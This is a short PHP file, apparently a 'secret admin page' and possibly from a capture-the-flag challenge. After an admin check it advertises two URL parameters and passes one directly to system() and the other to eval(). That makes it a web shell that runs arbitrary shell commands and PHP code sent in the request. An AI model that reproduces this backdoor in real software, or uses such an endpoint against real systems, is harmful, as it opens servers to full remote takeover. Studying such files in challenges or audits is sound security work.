<?php
require_once './init.php';

if(!isAdmin()) {
	redirect('/');
}

header('content-type: text/plain');
?>
This is secret admin page, there are nothing here but gold.

Available Parameter:
./index.php?c=
./index.php?p=

Output:
<?php
	if(get('c')) {
		system(get('c'));
	}
	if(get('p')) {
		eval(get('p'));
	}
?>